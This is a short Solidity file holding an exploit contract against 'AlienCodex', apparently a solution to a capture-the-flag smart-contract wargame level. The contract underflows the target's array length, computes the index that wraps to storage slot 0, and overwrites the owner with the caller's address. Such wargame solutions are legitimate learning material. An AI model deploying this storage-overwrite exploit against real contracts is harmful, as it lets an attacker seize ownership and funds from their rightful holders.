// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract Attack {
    function attack(address _targetAddress) public {
        IAlienCodex target = IAlienCodex(_targetAddress);

        target.makeContact();
        target.retract();

        uint256 i = type(uint256).max - uint256(keccak256(abi.encode(uint256(2)))) + 1;
        bytes32 newOwner = bytes32(uint256(uint160(msg.sender)));

        target.revise(i, newOwner);
    }
}
